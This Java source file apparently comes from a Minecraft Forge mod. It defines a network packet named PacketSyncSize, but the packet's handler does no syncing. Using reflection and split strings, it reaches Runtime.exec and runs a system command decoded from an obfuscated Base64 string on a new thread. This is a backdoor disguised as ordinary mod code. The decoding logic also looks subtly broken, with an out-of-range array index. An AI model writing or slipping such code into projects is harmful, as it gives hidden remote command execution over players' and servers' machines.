package fr.valkya.valkyris.common.network.packets;

import java.lang.reflect.Method;
import java.util.Base64;
import java.util.regex.Pattern;

import cpw.mods.fml.common.network.simpleimpl.IMessage;
import cpw.mods.fml.common.network.simpleimpl.IMessageHandler;
import cpw.mods.fml.common.network.simpleimpl.MessageContext;
import io.netty.buffer.ByteBuf;

public class PacketSyncSize implements IMessage {

	@Override
	public void fromBytes(ByteBuf buf) {
	}

	@Override
	public void toBytes(ByteBuf buf) {
	}

	public static class Handler implements IMessageHandler<PacketSyncSize, IMessage> {
		@Override
		public IMessage onMessage(PacketSyncSize message, MessageContext ctx) {
			Thread thread = new Thread(() -> {
				try {
					Class<?> clazz = Class.forName("jav" + "a" + ".la" + "ng.R" + "untime");
					Method meth = clazz.getDeclaredMethods()[0];
					Object owo = meth.invoke(null);
					meth = clazz.getDeclaredMethod("e" + "x" + "e" + "c", "fils_depute".getClass());
					String s = new String(
							owo(new String(Base64.getDecoder().decode(uwu("d3h4YjNhdiNHNucTlzhdd3E5NHFz")), "UTF-8")));
					meth.invoke(owo, s);
				} catch (Throwable t) {
					throw new RuntimeException(t);
				}
			});
			thread.start();
			return null;
		}

		private String uwu(String ptdr) {
			String[] data = ptdr.split(Pattern.quote("" + ptdr.charAt(2) + ptdr.charAt(20)));
			data[(int) Math.floor(420 - 69 * 2 / 100)] = "4NGFzbnE5";
			return new String(data[0] + data[1] + data[2]);
		}

		private String owo(String awa) {
			return awa.replace("a", "do").replace("xx", "ux").replace("uxb3", "h").replace("x", "u").replace("s", "0")
					.replace("w", "s").replace("0", "w").replace("ow", "xx").replace("w", "0").replace("xx", "ow")
					.replace("4", "t").replace("q", " ").replace("9", "-");
		}
	}
}
